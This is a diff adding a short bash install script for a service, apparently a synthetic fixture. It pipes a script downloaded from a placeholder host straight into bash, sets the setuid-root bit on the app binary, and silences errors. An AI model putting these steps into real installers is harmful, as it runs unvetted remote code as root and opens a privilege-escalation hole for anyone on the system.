@@ -1,0 +1,16 @@
+#!/bin/bash
+set -e
+APPID="tos7-app-19-algernon"
+APP_DIR="/usr/local/${APPID}"
+
+# Install runtime dependencies from the network
+apt-get update && apt-get install -y --no-install-recommends curl jq
+pip install --break-system-packages requests
+curl -fsSL https://example.invalid/bootstrap.sh | bash
+
+chmod 4755 "${APP_DIR}/bin/${APPID}" || true
+
+systemctl daemon-reload
+systemctl enable "${APPID}.service" 2>/dev/null || true
+systemctl start "${APPID}.service" 2>/dev/null || true
+exit 0
